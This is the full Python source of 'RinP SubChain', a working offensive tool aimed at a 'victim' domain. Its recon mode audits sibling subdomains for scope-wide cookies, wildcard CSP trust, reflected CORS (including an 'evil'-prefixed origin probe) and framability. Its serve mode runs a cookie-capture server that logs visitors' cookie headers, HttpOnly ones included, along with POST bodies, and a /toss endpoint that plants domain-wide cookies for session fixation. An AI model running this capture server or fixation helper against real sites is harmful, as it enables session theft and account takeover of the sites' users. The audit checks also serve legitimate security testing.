#!/usr/bin/env python3
"""
RinP SubChain - subdomain chaining audit under a controlled-subdomain hypothesis.

Given a victim registrable domain and a hypothetical subdomain under your
control, audit the victim's OTHER subdomains for primitives that chain across
the parent domain:

  cookie scope   Domain=.victim.com cookies are sent to your subdomain
                 (HttpOnly included - capture happens server-side) and can be
                 tossed/overwritten from it
  CSP trust      *.victim.com wildcards in script-src/connect-src/... make your
                 subdomain a trusted source for sibling applications
  CORS           reflected or wildcarded Access-Control-Allow-Origin with
                 credentials lets your origin read authenticated responses
  framing        missing X-Frame-Options / frame-ancestors enables iframe +
                 postMessage probing against sibling applications

Modes:
  recon   audit a list of sibling subdomains and print a chaining report
  serve   cookie-capture server to deploy on the controlled subdomain, with a
          /toss endpoint that sets Domain=<root> cookies for fixation tests

SameSite note: Strict/Lax do NOT restrict subdomain-to-subdomain traffic -
every *.victim.com host is the same site. Real intra-domain protections are
host-only cookies (no Domain attribute) and __Host- prefixed cookies.
"""

import argparse
import http.client
import http.server
import json
import logging
import re
import socket
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

LOG = logging.getLogger("subchain")

CSP_SOURCE_DIRECTIVES = (
    "script-src", "object-src", "connect-src", "form-action",
    "frame-ancestors", "img-src", "default-src", "worker-src", "manifest-src",
)

AUTH_LIKE_RE = re.compile(
    r"session|sess|sid$|_sid|auth|token|jwt|login|remember|csrf|xsrf|"
    r"state|nonce|oauth|uid=|userid", re.I)

MULTI_LABEL_SUFFIXES = (
    "co.uk", "org.uk", "gov.uk", "ac.uk", "com.tr", "com.au", "net.au",
    "co.jp", "or.jp", "ne.jp", "com.br", "com.mx", "com.cn", "com.tw",
    "co.in", "co.nz", "co.za", "com.sg", "com.hk", "com.ar", "com.co",
)


def parse_set_cookie(raw):
    """Parse one Set-Cookie header line into (name, dict of attributes)."""
    parts = raw.split(";")
    name, _, value = parts[0].partition("=")
    attrs = {"value": value.strip(), "domain": None, "path": None,
             "samesite": None, "httponly": False, "secure": False,
             "max-age": None, "expires": None,
             "__host": name.strip().startswith("__Host-"),
             "__secure": name.strip().startswith("__Secure-")}
    for part in parts[1:]:
        key, _, val = part.strip().partition("=")
        key = key.lower()
        if key in ("domain", "path", "samesite"):
            attrs[key] = val.strip().lower() if key != "path" else val.strip()
        elif key in ("max-age", "expires"):
            attrs[key] = val.strip()
        elif key == "httponly":
            attrs["httponly"] = True
        elif key == "secure":
            attrs["secure"] = True
    return name.strip(), attrs


def cookie_is_deletion(attrs):
    """True for Max-Age=0 / negative or an Expires in the past."""
    import email.utils
    if attrs["max-age"] is not None:
        try:
            if int(attrs["max-age"]) <= 0:
                return True
        except ValueError:
            pass
    if attrs["expires"]:
        try:
            when = email.utils.parsedate_to_datetime(attrs["expires"])
            import datetime
            return when.timestamp() < datetime.datetime.now(
                datetime.timezone.utc).timestamp()
        except (TypeError, ValueError):
            pass
    return False


def host_under_domain(host, root):
    """True when host is a subdomain of root (or equals it)."""
    host = host.lower().rstrip(".")
    root = root.lower().rstrip(".")
    return host == root or host.endswith("." + root)


def cookie_labels(attrs, root, controlled, name=""):
    """Classify one observed cookie relative to the controlled subdomain."""
    labels = []
    if cookie_is_deletion(attrs):
        return ["DELETION (Max-Age=0 / past Expires: clears the cookie, "
                "not a chain primitive)"]
    if AUTH_LIKE_RE.search(name or ""):
        labels.append("* AUTH-LIKE name (prime toss/shadow target)")
    dom = attrs["domain"]
    scoped = dom is not None and host_under_domain(controlled,
                                                   dom.lstrip("."))
    if attrs["__host"]:
        return ["PROTECTED (__Host- prefix: cannot be tossed, host-only)"]
    if scoped:
        labels.append("RECEIVABLE (Domain=" + dom + " -> sent to every "
                      "subdomain, HttpOnly included; capture server-side)")
        if attrs["__secure"]:
            labels.append("TOSSABLE over https only (__Secure- prefix)")
        else:
            labels.append("TOSSABLE (overwrite/fixate via Domain=" + dom + ")")
    elif dom is not None and host_under_domain(dom.lstrip("."), root):
        labels.append("SCOPED-DEEPER (Domain=" + dom + " reaches only that "
                      "host's subdomains; your " + controlled + " is outside "
                      "it, but a Domain-wide cookie can still SHADOW it)")
    else:
        labels.append("HOST-ONLY (no Domain attribute: not receivable, but a "
                      "same-name Domain-wide cookie can SHADOW it; a Domain-"
                      "wide cookie with a DEEPER Path is sent first on that "
                      "path - path-precedence poisoning)")
    if attrs["path"] and attrs["path"] != "/":
        labels.append("Path=%s (mirror or deepen the path when tossing for "
                      "precedence on those paths)" % attrs["path"])
    note = []
    if attrs["httponly"]:
        note.append("HttpOnly")
    if attrs["secure"]:
        note.append("Secure (your subdomain must serve https to receive or "
                    "toss this)")
    if attrs["samesite"]:
        note.append("SameSite=" + attrs["samesite"] +
                    " (same-site subdomains are unaffected)")
        if attrs["samesite"] == "none" and not attrs["secure"]:
            note.append("WARN: SameSite=None without Secure is rejected "
                        "by modern browsers")
    if note:
        labels.append("attrs: " + ", ".join(note))
    return labels


def csp_matches(source, controlled_host):
    """
    True when a CSP host-source admits the controlled subdomain.

    Port rule (verified against Chromium): a host-source without a port part
    matches only the scheme's default ports; ':*' matches any port; an
    explicit port matches that port only.
    """
    src = source.strip().lower()
    if "://" in src:
        _, _, src = src.partition("://")
    host_part = src.split("/", 1)[0]
    port = ""
    if ":" in host_part:
        host_part, _, port = host_part.rpartition(":")
    if host_part.startswith("*."):
        if not host_under_domain(controlled_host, host_part[2:]):
            return False
    elif host_part != controlled_host.lower():
        return False
    return port in ("", "*")


def csp_port_note(source):
    """Human note for sources whose port part constrains the chain."""
    src = source.strip().lower()
    if "://" in src:
        _, _, src = src.partition("://")
    host_part = src.split("/", 1)[0]
    if ":" in host_part:
        _, _, port = host_part.rpartition(":")
        if port not in ("", "*"):
            return " (requires serving on port " + port + ")"
    return ""


def parse_csp_trust(headers, controlled_host, root):
    """Find CSP directives whose source list trusts the controlled host."""
    policies = headers.get_all("Content-Security-Policy", []) or []
    found = []
    for policy in policies:
        directives = {}
        for chunk in policy.split(";"):
            tokens = chunk.split()
            if tokens:
                directives[tokens[0].lower()] = tokens[1:]
        strict_dynamic = any(
            "'strict-dynamic'" in directives.get(d, []) for d in
            CSP_SOURCE_DIRECTIVES)
        for directive, sources in directives.items():
            if directive not in CSP_SOURCE_DIRECTIVES:
                continue
            hits = [s for s in sources if csp_matches(s, controlled_host)]
            if hits or "*" in sources:
                note = "".join(csp_port_note(s) for s in hits[:1])
                if strict_dynamic:
                    note += " [DOWNGRADED: 'strict-dynamic' present - CSP3 " \
                            "ignores host allowlists]"
                found.append((directive, [h + note for h in (hits or ["*"])]))
    if len(policies) > 1:
        found.append(("note", ["multiple Content-Security-Policy headers "
                               "delivered; browsers intersect them - verify "
                               "every policy admits your host"]))
    return found


def fetch(url, extra_headers=None, timeout=8):
    """GET a URL, return (final_url, status, http.client.HTTPMessage headers)."""
    req = urllib.request.Request(url, headers=dict(extra_headers or {}))
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.geturl(), resp.status, resp.headers
    except urllib.error.HTTPError as exc:
        return exc.geturl(), exc.code, exc.headers
    except (urllib.error.URLError, socket.timeout, OSError, ValueError,
            http.client.HTTPException) as exc:
        return url, None, str(exc)


def audit_host(host, root, controlled, timeout):
    """Collect chaining primitives from one sibling subdomain."""
    result = {"host": host, "status": None, "cookies": [], "csp": [],
              "cors": [], "framing": None, "error": None}
    base = status = headers = None
    for scheme in ("https", "http"):
        base = scheme + "://" + host
        _, status, headers = fetch(base, timeout=timeout)
        if status is not None:
            break
    if status is None:
        result["error"] = headers
        return result
    result["status"] = status

    for raw in headers.get_all("Set-Cookie") or []:
        name, attrs = parse_set_cookie(raw)
        result["cookies"].append({
            "name": name,
            "attrs": attrs,
            "labels": cookie_labels(attrs, root, controlled, name),
        })

    result["csp"] = parse_csp_trust(headers, controlled, root)

    _, status2, headers2 = fetch(
        base, {"Origin": "https://" + controlled}, timeout=timeout)
    if status2 is not None:
        acao = headers2.get("Access-Control-Allow-Origin")
        acac = headers2.get("Access-Control-Allow-Credentials")
        if acao:
            if acao == "*":
                result["cors"].append("CORS-OPEN (ACAO: *; no credentials)")
            elif acao == "https://" + controlled:
                if acac and acac.lower() == "true":
                    result["cors"].append(
                        "CORS-CREDENTIALED (ACAO reflects your origin + "
                        "credentials: authenticated cross-origin reads)")
                else:
                    result["cors"].append(
                        "CORS-REFLECTED (ACAO reflects your origin, "
                        "credentials not allowed)")

    decoy = "https://evil" + root
    _, status3, headers3 = fetch(base, {"Origin": decoy}, timeout=timeout)
    if status3 is not None and headers3.get(
            "Access-Control-Allow-Origin") == decoy:
        result["cors"].append(
            "CORS-SUFFIX-BUG (ACAO reflects " + decoy + " too: origin check "
            "is suffix/substring based - any evil" + root + " registrable "
            "domain passes, no subdomain needed)")

    xfo = headers.get("X-Frame-Options")
    fa = None
    for policy in headers.get_all("Content-Security-Policy") or []:
        for chunk in policy.split(";"):
            tokens = chunk.split()
            if tokens and tokens[0].lower() == "frame-ancestors":
                fa = tokens[1:]
    if xfo and xfo.upper() in ("DENY", "SAMEORIGIN"):
        result["framing"] = "blocked (X-Frame-Options: " + xfo + ")"
    elif fa:
        result["framing"] = "frame-ancestors: " + " ".join(fa)
    else:
        result["framing"] = ("FRAMABLE (no X-Frame-Options / frame-ancestors: "
                             "iframe + postMessage probing possible)")
    return result


def print_report(results, root, controlled, json_path):
    """Render the chaining report; optionally dump structured JSON."""
    print()
    print("=" * 72)
    print("hypothetical control: https://" + controlled)
    print("victim registrable domain: " + root)
    print("=" * 72)
    chainable = {"RECEIVABLE": 0, "TOSSABLE": 0, "SHADOW": 0, "CSP": 0,
                 "CORS": 0, "FRAMABLE": 0}
    for res in results:
        print()
        print("--- " + res["host"] + " " + ("(HTTP %s)" % res["status"]
                                            if res["status"] else "(error)"))
        if res["error"]:
            print("    error: " + res["error"])
            continue
        for cookie in res["cookies"]:
            joined = " | ".join(cookie["labels"])
            print("    cookie %-20s %s" % (cookie["name"], joined))
            for label in cookie["labels"]:
                if label.startswith("RECEIVABLE"):
                    chainable["RECEIVABLE"] += 1
                if "TOSSABLE" in label or "SHADOW" in label:
                    chainable["TOSSABLE"] += 1
                if "SHADOW" in label:
                    chainable["SHADOW"] += 1
        for directive, hits in res["csp"]:
            print("    CSP TRUSTED-%s via %s" % (directive, ", ".join(hits)))
            chainable["CSP"] += 1
        for note in res["cors"]:
            print("    " + note)
            chainable["CORS"] += 1
        if res["framing"] and res["framing"].startswith("FRAMABLE"):
            print("    " + res["framing"])
            chainable["FRAMABLE"] += 1
        elif res["framing"]:
            print("    framing: " + res["framing"])
    print()
    print("=" * 72)
    print("CHAIN SUMMARY for " + controlled)
    print("  receivable cookies ......... %d" % chainable["RECEIVABLE"])
    print("  tossable/shadowable ........ %d" % chainable["TOSSABLE"])
    print("  CSP-trusted directives ..... %d" % chainable["CSP"])
    print("  CORS chains ................ %d" % chainable["CORS"])
    print("  framable hosts ............. %d" % chainable["FRAMABLE"])
    print("=" * 72)
    print("note: SameSite=Strict/Lax do not protect subdomain-to-subdomain")
    print("requests - all *." + root + " hosts are the same site. Protections")
    print("that matter here: host-only cookies and __Host- prefixes.")
    print("note: same-site request forgery applies by definition (your host")
    print("is same-site). On FRAMABLE hosts also probe document.domain")
    print("relaxation (legacy SOP bypass: relaxing to " + root +
          " grants full same-origin access).")
    if json_path:
        with open(json_path, "w") as fh:
            json.dump({"root": root, "controlled": controlled,
                       "results": results}, fh, indent=2)
        print("json report: " + json_path)


class CaptureHandler(http.server.BaseHTTPRequestHandler):
    """Cookie-capture endpoint plus a /toss fixation helper."""

    root = None
    sink = None

    def log_message(self, fmt, *args):
        LOG.info("%s - %s", self.client_address[0], fmt % args)

    def _record(self):
        entry = {"time": time.strftime("%Y-%m-%dT%H:%M:%S"),
                 "client": self.client_address[0],
                 "method": self.command,
                 "path": self.path,
                 "cookie": self.headers.get("Cookie"),
                 "referer": self.headers.get("Referer"),
                 "user_agent": self.headers.get("User-Agent")}
        print(json.dumps(entry))
        if self.sink:
            with open(self.sink, "a") as fh:
                fh.write(json.dumps(entry) + "\n")
        return entry

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path == "/toss":
            params = urllib.parse.parse_qs(parsed.query)
            name = params.get("name", ["session"])[0]
            value = params.get("value", ["fixated"])[0]
            cookie = "%s=%s; Domain=%s; Path=%s" % (
                name, value, self.root, params.get("path", ["/"])[0])
            if params.get("secure", ["1"])[0] in ("1", "true"):
                cookie += "; Secure"
            self.send_response(200)
            self.send_header("Set-Cookie", cookie)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(("tossed: " + cookie).encode())
            return
        self._record()
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(b"<!doctype html><title>ok</title>capturing")
        if self.root:
            self.wfile.write(("<p>toss helper: /toss?name=...&value=... "
                              "(Domain=" + self.root + ")</p>").encode())

    def do_POST(self):
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(length).decode("latin-1", "replace")
        entry = self._record()
        entry["body"] = body
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok")


def run_serve(args):
    """Run the capture server meant to sit behind the controlled subdomain."""
    handler = type("Bound", (CaptureHandler,),
                   {"root": args.domain, "sink": args.out})
    server = http.server.ThreadingHTTPServer((args.bind, args.port), handler)
    print("capture server on http://%s:%d (deploy behind %s)" %
          (args.bind, args.port, "<controlled-subdomain>"))
    print("cookies arrive in request logs; toss helper at /toss?name=&value=")
    if args.out:
        print("capturing to " + args.out)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass


def read_list(path):
    """Read subdomain hosts from a file (one per line, # comments, extra
    columns tolerated)."""
    hosts = []
    with open(path) as fh:
        for line in fh:
            line = line.split("#", 1)[0].strip()
            for host in line.split():
                hosts.append(host.split("//")[-1].split("/")[0])
    return hosts


def main():
    parser = argparse.ArgumentParser(
        description="RinP SubChain - chaining audit under a "
                    "controlled-subdomain hypothesis")
    sub = parser.add_subparsers(dest="mode", required=True)

    recon = sub.add_parser("recon", help="audit sibling subdomains")
    recon.add_argument("--domain", required=True, metavar="ROOT",
                       help="victim registrable domain, e.g. victim.com")
    recon.add_argument("--controlled", required=True, metavar="HOST",
                       help="subdomain assumed under your control")
    recon.add_argument("--list", required=True, metavar="FILE",
                       help="sibling subdomains to audit (one per line)")
    recon.add_argument("--json", metavar="FILE", help="also write a JSON report")
    recon.add_argument("--timeout", type=int, default=8)

    serve = sub.add_parser("serve", help="cookie-capture server (+ /toss)")
    serve.add_argument("--domain", required=True, metavar="ROOT",
                       help="cookie Domain scope for /toss fixation helper")
    serve.add_argument("--bind", default="0.0.0.0")
    serve.add_argument("--port", type=int, default=8080)
    serve.add_argument("--out", metavar="FILE", help="append captures as JSONL")

    args = parser.parse_args()
    logging.basicConfig(level=logging.INFO,
                        format="%(asctime)s %(levelname)s %(message)s")

    if args.mode == "serve":
        run_serve(args)
        return

    if not host_under_domain(args.controlled, args.domain):
        raise SystemExit("--controlled must be a subdomain of --domain")
    if args.domain in MULTI_LABEL_SUFFIXES:
        raise SystemExit("--domain " + args.domain + " is a public suffix; "
                         "pass the registrable domain (e.g. example." +
                         args.domain + ")")
    hosts = read_list(args.list)
    hosts = [h for h in hosts if h != args.controlled]
    if not hosts:
        raise SystemExit("no sibling hosts to audit in " + args.list)

    results = []
    for host in hosts:
        LOG.info("auditing %s", host)
        results.append(audit_host(host, args.domain, args.controlled,
                                  args.timeout))
    print_report(results, args.domain, args.controlled, args.json)


if __name__ == "__main__":
    main()
